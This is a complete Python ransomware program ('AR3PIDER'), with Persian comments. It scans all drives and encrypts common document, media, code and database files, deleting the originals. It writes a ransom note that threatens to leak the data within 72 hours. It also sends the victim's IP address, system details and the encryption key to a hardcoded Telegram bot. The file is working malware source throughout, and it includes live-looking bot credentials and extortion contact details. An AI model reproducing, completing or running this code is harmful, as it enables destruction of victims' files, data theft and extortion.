import os
import uuid
import threading
from queue import Queue, Empty
from cryptography.fernet import Fernet, InvalidToken
from platform import release, machine, version
import requests
import time
import psutil
from typing import List, Set, Optional
from datetime import datetime
import traceback
import sys

class AdvancedRansomware:
    def __init__(self):
        # تنظیمات
        self.EMAIL = "recovery-data09@protonmail.com"
        self.KEY = Fernet.generate_key()
        self.fernet = Fernet(self.KEY)
        
        # تنظیمات فایل‌ها
        self.file_extensions = [
            "jpg", "jpeg", "png", "gif", "bmp", "svg", "psd", "raw",
            "php", "js", "html", "css", "py", "java", "cpp", "c", "h",
            "mp4", "avi", "mov", "mkv", "flv", "wmv", "mp3", "wav", "flac",
            "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "rtf",
            "zip", "rar", "7z", "tar", "gz", "bz2", "bak", "backup",
            "sql", "db", "mdb", "accdb", "csv", "json", "xml",
        ]
        
        # لیست سیاه
        self.blacklisted_dirs = {
            "Windows", "Program Files", "Program Files (x86)",
            "AppData", "System Volume Information", "Boot"
        }
        
        # تنظیمات سیستم
        self.max_file_size = 100 * 1024 * 1024  # 100MB
        self.chunk_size = 64 * 1024  # 64KB
        self.worker_count = self.calculate_optimal_thread_count()
        self.victim_id = self.generate_short_id()
        self.task_queue = Queue(maxsize=10000)
        self.processed_count = 0
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.start_time = datetime.now()
        self.failed_files = set()
        self.max_retries = 3

    def generate_short_id(self) -> str:
        """تولید شناسه کوتاه 7 رقمی با مدیریت خطا"""
        try:
            full_id = str(uuid.uuid4()).replace('-', '').upper()
            return full_id[:7]
        except Exception as e:
            print(f"Error generating ID: {e}")
            return "UNKNOWN"

    def calculate_optimal_thread_count(self) -> int:
        """محاسبه تعداد بهینه threadها با مدیریت خطا"""
        try:
            cpu_count = os.cpu_count() or 4
            mem_gb = psutil.virtual_memory().total // (1024 ** 3)
            return min(cpu_count * 2, max(4, mem_gb * 2))
        except Exception as e:
            print(f"Error calculating thread count: {e}")
            return 8

    def get_runtime_info(self) -> str:
        """اطلاعات زمان اجرا با مدیریت خطا"""
        try:
            elapsed = datetime.now() - self.start_time
            return f"Files: {self.processed_count} | Runtime: {str(elapsed).split('.')[0]}"
        except Exception as e:
            print(f"Error getting runtime info: {e}")
            return "Runtime info unavailable"

    def show_banner(self, mode: str) -> None:
        """نمایش بنر با مدیریت خطا"""
        try:
            title = self.get_runtime_info()
            banner = f"""
            █████╗ ██████╗  █████╗ ███████╗██████╗ ██╗██████╗ ███████╗██████╗ 
            ██╔══██╗╚════██╗██╔══██╗╚════██║╚════██╗██║██╔══██╗██╔════╝██╔══██╗
            ███████║ █████╔╝███████║    ██╔╝ █████╔╝██║██████╔╝█████╗  ██████╔╝
            ██╔══██║██╔═══╝ ██╔══██║   ██╔╝ ██╔═══╝ ██║██╔══██╗██╔══╝  ██╔══██╗
            ██║  ██║███████╗██║  ██║   ██║  ███████╗██║██║  ██║███████╗██║  ██║
            ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝  ╚══════╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
            
            {'ENCRYPTION MODE' if mode == 'encrypt' else 'DECRYPTION MODE'}
            {title}
            Version: 2.2 | Threads: {self.worker_count} | ID: {self.victim_id}
            """
            print(banner)
        except Exception as e:
            print(f"Error displaying banner: {e}")

    def find_drives(self) -> List[str]:
        """پیدا کردن درایوهای موجود با مدیریت خطا"""
        drives = []
        try:
            if os.name == 'nt':  # Windows
                for d in range(ord('A'), ord('Z')+1):
                    drive = f"{chr(d)}:"
                    if os.path.exists(drive):
                        drives.append(drive)
            else:  # Linux/Mac
                drives.append("/")
        except Exception as e:
            print(f"Error finding drives: {e}")
        return drives

    def is_blacklisted(self, path: str) -> bool:
        """بررسی مسیرهای سیاه‌لیست شده با مدیریت خطا"""
        try:
            path_parts = os.path.normpath(path).split(os.sep)
            return any(part in self.blacklisted_dirs for part in path_parts)
        except Exception as e:
            print(f"Error checking blacklist: {e}")
            return False

    def find_files(self, drives: List[str]) -> None:
        """پیدا کردن فایل‌ها با مدیریت خطا و قابلیت توقف"""
        try:
            for drive in drives:
                if self.stop_event.is_set():
                    break
                    
                for root, _, files in os.walk(drive):
                    if self.stop_event.is_set():
                        break
                        
                    if self.is_blacklisted(root):
                        continue
                    
                    for file in files:
                        if self.stop_event.is_set():
                            break
                            
                        try:
                            ext = file.split('.')[-1].lower() if '.' in file else ''
                            if ext in self.file_extensions:
                                file_path = os.path.join(root, file)
                                while self.task_queue.full() and not self.stop_event.is_set():
                                    time.sleep(0.1)
                                self.task_queue.put(file_path)
                        except Exception as e:
                            print(f"Error processing file {file}: {e}")
                            continue
        except Exception as e:
            print(f"Error in file search: {e}")

    def worker(self, action: str) -> None:
        """کارگر با مدیریت خطا و قابلیت توقف"""
        while not self.stop_event.is_set():
            file_path = None
            try:
                try:
                    file_path = self.task_queue.get(timeout=1)
                except Empty:
                    continue
                
                # پردازش فایل
                for attempt in range(self.max_retries):
                    try:
                        if action == "encrypt":
                            self.encrypt_file(file_path)
                        elif action == "decrypt":
                            self.decrypt_file(file_path)
                        break
                    except Exception as e:
                        if attempt == self.max_retries - 1:
                            with self.lock:
                                self.failed_files.add(file_path)
                                print(f"Failed to process {file_path} after {self.max_retries} attempts: {e}")
                        time.sleep(0.5 * (attempt + 1))
                
                # افزایش شمارنده و علامت گذاری تکمیل کار
                with self.lock:
                    self.processed_count += 1
                self.task_queue.task_done()
                
            except Exception as e:
                print(f"Worker error: {e}")
                if file_path:
                    with self.lock:
                        self.failed_files.add(file_path)
                    self.task_queue.task_done()
                continue

    def encrypt_file(self, file_path: str) -> None:
        """رمزنگاری با مدیریت خطا و قابلیت توقف"""
        if self.stop_event.is_set():
            return
            
        try:
            if os.path.getsize(file_path) > self.max_file_size:
                return

            temp_file = file_path + ".tmp_enc"
            success = False
            
            try:
                with open(file_path, "rb") as f_in, open(temp_file, "wb") as f_out:
                    while True:
                        if self.stop_event.is_set():
                            return
                        chunk = f_in.read(self.chunk_size)
                        if not chunk:
                            break
                        enc_chunk = self.fernet.encrypt(chunk)
                        f_out.write(enc_chunk)
                
                os.replace(temp_file, file_path + ".Encrypted")
                try:
                    os.remove(file_path)
                except Exception as e:
                    print(f"Error deleting original file {file_path}: {e}")
                success = True
            except Exception as e:
                print(f"Error encrypting {file_path}: {e}")
            finally:
                if not success and os.path.exists(temp_file):
                    try:
                        os.remove(temp_file)
                    except Exception as e:
                        print(f"Error cleaning up temp file {temp_file}: {e}")
        except Exception as e:
            print(f"Error in encryption process for {file_path}: {e}")

    def decrypt_file(self, file_path: str) -> None:
        """رمزگشایی با مدیریت خطا و قابلیت توقف"""
        if self.stop_event.is_set():
            return
            
        try:
            if not file_path.endswith(".Encrypted"):
                return

            original_path = file_path[:-9]
            temp_file = original_path + ".tmp_dec"
            success = False
            
            try:
                with open(file_path, "rb") as f_in, open(temp_file, "wb") as f_out:
                    while True:
                        if self.stop_event.is_set():
                            return
                        chunk = f_in.read(self.chunk_size + 64)
                        if not chunk:
                            break
                        try:
                            dec_chunk = self.fernet.decrypt(chunk)
                            f_out.write(dec_chunk)
                        except InvalidToken:
                            print(f"Invalid token in {file_path} - possible corruption")
                            return
                
                os.replace(temp_file, original_path)
                try:
                    os.remove(file_path)
                except Exception as e:
                    print(f"Error deleting encrypted file {file_path}: {e}")
                success = True
            except Exception as e:
                print(f"Error decrypting {file_path}: {e}")
            finally:
                if not success and os.path.exists(temp_file):
                    try:
                        os.remove(temp_file)
                    except Exception as e:
                        print(f"Error cleaning up temp file {temp_file}: {e}")
        except Exception as e:
            print(f"Error in decryption process for {file_path}: {e}")

    def create_ransom_note(self) -> None:
        """ایجاد فایل یادداشت با مدیریت خطا"""
        note = f""">>> ALL YOUR IMPORTANT FILES ARE STOLEN AND ENCRYPTED <<<

Important:
- We have downloaded your files. Your data will be leaked within the next 72 hours.
- Contact us immediately to prevent data leakage and recover your files.

Contact:
- Email-1: recovery-data09@protonmail.com
- Email-2: Emilygoodgirl09@gmail.com
- Telegram: @Data_recovery09
-EMAIL : {self.EMAIL}

Do not message data recovery companies, they will scam you.
If you have a data recovery palace, send a message to the email or Telegram ID.

If you don't message us within 72 hours and don't agree with us, we will leak all your files and publish them on famous sites!!

Warning:
- Tampering with files or using third-party tools WILL cause permanent damage.
- Act fast! The price will increase if you delay.

Free Decryption:
- Send 3 small files (max 1MB) for free decryption. 

Your Personal ID: {self.victim_id}
"""
        try:
            for drive in self.find_drives():
                note_path = os.path.join(drive, "READ_TO_RECOVER.txt")
                try:
                    with open(note_path, "w", encoding="utf-8") as file:
                        file.write(note)
                except Exception as e:
                    print(f"Could not create ransom note on {drive}: {e}")
        except Exception as e:
            print(f"Error creating ransom notes: {e}")

    def send_data_with_retry(self, max_retries: int = 3) -> bool:
        """ارسال اطلاعات با مدیریت خطا و تکرار"""
        for attempt in range(max_retries):
            try:
                ip = requests.get("https://api.ipify.org", timeout=10).text
                versionWIN = version()
                processor = machine()
                winNumber = release()

                token = "7478447067:AAHVDOiC1e8iQZJI-AbWm28LrEHJstEKxYs"
                chat_id = "7739827412"
                msg = (
                    "Hi Elliot, \n"
                    "Here is the information: \n"
                    "IP Address: {} \n"
                    "Windows Version: {} \n"
                    "Processor: {} \n"
                    "Number of Windows: {} \n"
                    "Key: {} \n\n"
                    "server-id: {}"
                ).format(ip, versionWIN, processor, winNumber, self.KEY.decode(), self.victim_id)

                url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={msg}"
                response = requests.get(url, timeout=15)
                response.raise_for_status()
                return True
            except Exception as e:
                print(f"Attempt {attempt + 1} failed: {e}")
                if attempt < max_retries - 1:
                    time.sleep(5 * (attempt + 1))
        return False

    def run_encryption(self) -> None:
        """اجرای رمزنگاری با مدیریت خطا"""
        self.show_banner('encrypt')
        
        try:
            drives = self.find_drives()
            print(f"[*] Scanning {len(drives)} drives...")

            threads = []
            for _ in range(self.worker_count):
                t = threading.Thread(target=self.worker, args=("encrypt",), daemon=True)
                t.start()
                threads.append(t)

            file_finder_thread = threading.Thread(target=self.find_files, args=(drives,), daemon=True)
            file_finder_thread.start()

            start_time = time.time()
            last_count = 0
            
            while file_finder_thread.is_alive() or not self.task_queue.empty():
                current_count = self.processed_count
                if current_count != last_count:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.show_banner('encrypt')
                    print(f"\n[*] Files processed: {current_count}")
                    last_count = current_count
                time.sleep(0.5)

            self.stop_event.set()
            for t in threads:
                t.join()
            file_finder_thread.join()
            
            end_time = time.time()
            os.system('cls' if os.name == 'nt' else 'clear')
            self.show_banner('encrypt')
            print(f"\n[+] Encryption completed in {end_time - start_time:.2f} seconds")
            print(f"[+] Total files processed: {self.processed_count}")
            
            if self.failed_files:
                print(f"[-] Failed to process {len(self.failed_files)} files")
            
            self.create_ransom_note()
            if self.send_data_with_retry():
                print("[+] System data sent successfully")
            else:
                print("[-] Failed to send system data")
            
            print("\n[!] Encryption Key:")
            print(f"KEY: {self.KEY.decode()}")
            print("\n[!] Save this key for decryption!")
            
        except KeyboardInterrupt:
            self.stop_event.set()
            print("\n[!] Encryption interrupted by user")
        except Exception as e:
            print(f"\n[!] Critical error during encryption: {e}")
            traceback.print_exc()

    def validate_key(self, key: str) -> bool:
        """اعتبارسنجی کلید با مدیریت خطا"""
        try:
            if len(key) != 44:
                return False
            Fernet(key.encode())
            return True
        except Exception as e:
            print(f"Invalid key: {e}")
            return False

    def run_decryption(self) -> None:
        """اجرای رمزگشایی با مدیریت خطا"""
        self.show_banner('decrypt')
        
        try:
            print("[*] Please enter the decryption key:")
            while True:
                key_input = input("KEY: ").strip()
                if self.validate_key(key_input):
                    break
                print("[-] Invalid key! Key must be 44 URL-safe base64-encoded characters.")
            
            self.KEY = key_input.encode()
            self.fernet = Fernet(self.KEY)

            drives = self.find_drives()
            print(f"[*] Scanning {len(drives)} drives for encrypted files...")

            threads = []
            for _ in range(self.worker_count):
                t = threading.Thread(target=self.worker, args=("decrypt",), daemon=True)
                t.start()
                threads.append(t)

            for drive in drives:
                if self.stop_event.is_set():
                    break
                    
                for root, _, files in os.walk(drive):
                    if self.stop_event.is_set():
                        break
                        
                    for file in files:
                        if self.stop_event.is_set():
                            break
                            
                        if file.endswith(".Encrypted"):
                            file_path = os.path.join(root, file)
                            while self.task_queue.full() and not self.stop_event.is_set():
                                time.sleep(0.1)
                            self.task_queue.put(file_path)

            start_time = time.time()
            last_count = 0
            
            while not self.task_queue.empty():
                current_count = self.processed_count
                if current_count != last_count:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.show_banner('decrypt')
                    print(f"\n[*] Files processed: {current_count}")
                    last_count = current_count
                time.sleep(0.5)

            self.stop_event.set()
            for t in threads:
                t.join()
            
            end_time = time.time()
            os.system('cls' if os.name == 'nt' else 'clear')
            self.show_banner('decrypt')
            print(f"\n[+] Decryption completed in {end_time - start_time:.2f} seconds")
            print(f"[+] Total files decrypted: {self.processed_count}")
            
            if self.failed_files:
                print(f"[-] Failed to decrypt {len(self.failed_files)} files")
            
        except KeyboardInterrupt:
            self.stop_event.set()
            print("\n[!] Decryption interrupted by user")
        except Exception as e:
            print(f"\n[!] Critical error during decryption: {e}")
            traceback.print_exc()

def main() -> None:
    """تابع اصلی با مدیریت خطا"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\n" + "="*50)
        print(" AR3PIDER RANSOMWARE TOOL ".center(50, '#'))
        print("="*50 + "\n")
        
        print("1. Encrypt Files")
        print("2. Decrypt Files")
        print("3. Exit\n")
        
        while True:
            choice = input("Select operation (1-3): ").strip()
            if choice in ("1", "2", "3"):
                break
            print("Invalid choice! Please enter 1, 2 or 3")
        
        ransomware = AdvancedRansomware()
        
        if choice == "1":
            ransomware.run_encryption()
        elif choice == "2":
            ransomware.run_decryption()
        elif choice == "3":
            print("Exiting...")
            
    except KeyboardInterrupt:
        print("\nOperation cancelled by user")
    except Exception as e:
        print(f"\nAn unexpected error occurred: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main()